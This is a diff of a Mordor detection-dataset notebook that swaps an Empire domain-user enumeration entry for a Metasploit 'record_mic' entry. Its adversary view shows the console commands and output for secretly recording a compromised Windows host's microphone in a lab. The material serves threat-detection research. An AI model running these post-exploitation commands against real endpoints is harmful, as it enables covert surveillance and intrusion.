@@ -4,7 +4,7 @@
    "cell_type": "markdown",
    "metadata": {},
    "source": [
-    "# Empire Net All User Domain"
+    "# MSF Record Microphone"
    ]
   },
   {
@@ -21,15 +21,15 @@
     "\n",
     "|                   |    |\n",
     "|:------------------|:---|\n",
-    "| id                | SD-190319021158 |\n",
+    "| id                | SD-200609225055 |\n",
     "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
-    "| creation date     | 2019/03/19 |\n",
+    "| creation date     | 2020/06/09 |\n",
     "| platform          | Windows |\n",
     "| Mordor Environment| shire |\n",
     "| Simulation Type   | C2 |\n",
-    "| Simulation Tool   | Empire |\n",
-    "| Simulation Script |  |\n",
-    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/discovery/empire_net_user_domain.tar.gz |"
+    "| Simulation Tool   | Metasploit |\n",
+    "| Simulation Script | https://github.com/pwnieexpress/metasploit-framework/blob/master/modules/post/multi/manage/record_mic.rb |\n",
+    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/collection/msf_record_mic.zip |"
    ]
   },
   {
@@ -37,7 +37,7 @@
    "metadata": {},
    "source": [
     "## Dataset Description\n",
-    "This dataset represents adversaries enumerating all users that belong to a domain via the net.exe utility"
+    "This dataset represents adversaries accessing the microphone of an endpoint."
    ]
   },
   {
@@ -46,25 +46,45 @@
    "source": [
     "## Adversary View\n",
     "```\n",
-    "(Empire: FD6A3MGY) >shell net user /domain\n",
-    "[*] Tasked FD6A3MGY to run TASK_SHELL\n",
-    "[*] Agent FD6A3MGY tasked with task ID 6\n",
-    "(Empire: FD6A3MGY) > The request will be processed at a domain controller for domain shire.com.\n",
+    "msf5 exploit(multi/handler) > use post/multi/manage/record_mic\n",
+    "msf5 post(multi/manage/record_mic) > set SESSION 2\n",
+    "SESSION => 2\n",
+    "msf5 post(multi/manage/record_mic) > info\n",
     "\n",
+    "      Name: Multi Manage Record Microphone\n",
+    "    Module: post/multi/manage/record_mic\n",
+    "  Platform: Linux, OSX, Windows\n",
+    "      Arch: \n",
+    "      Rank: Normal\n",
     "\n",
-    "User accounts for \\\\HFDC01.shire.com\n",
+    "Provided by:\n",
+    "  sinn3r <sinn3r@metasploit.com>\n",
     "\n",
-    "-------------------------------------------------------------------------------\n",
-    "Administrator            DefaultAccount           Guest                    \n",
-    "krbtgt                   lrodriguez               Mmidge                   \n",
-    "nmartha                  oda                      pgustavo                 \n",
-    "ttest                    WECserver                \n",
-    "The command completed successfully.\n",
+    "Compatible session types:\n",
+    "  Meterpreter\n",
     "\n",
+    "Basic options:\n",
+    "  Name      Current Setting  Required  Description\n",
+    "  ----      ---------------  --------  -----------\n",
+    "  DURATION  5                no        Number of seconds to record\n",
+    "  SESSION   2                yes       The session to run this module on.\n",
     "\n",
-    "..Command execution completed.\n",
+    "Description:\n",
+    "  This module will enable and record your target's microphone. For \n",
+    "  non-Windows targets, please use Java meterpreter to be able to use \n",
+    "  this feature.\n",
     "\n",
-    "(Empire: FD6A3MGY) >\n",
+    "msf5 post(multi/manage/record_mic) > run\n",
+    "\n",
+    "[*] 172.18.39.6 - 20%...\n",
+    "[*] 172.18.39.6 - 40%...\n",
+    "[*] 172.18.39.6 - 60%...\n",
+    "[*] 172.18.39.6 - 80%...\n",
+    "[*] 172.18.39.6 - 100%...\n",
+    "[*] 172.18.39.6 - Audio size: (55169 bytes)\n",
+    "[+] 172.18.39.6 - Audio recording saved: /home/msf/.msf4/loot/20200610025201_default_172.18.39.6_172.18.39.6.audi_358712.wav\n",
+    "[*] Post module execution completed\n",
+    "msf5 post(multi/manage/record_mic) >\n",
     "```"
    ]
   },
@@ -105,7 +125,7 @@
    "metadata": {},
    "outputs": [],
    "source": [
-    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/discovery/empire_net_user_domain.tar.gz\"\n",
+    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/collection/msf_record_mic.zip\"\n",
     "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
    ]
   },
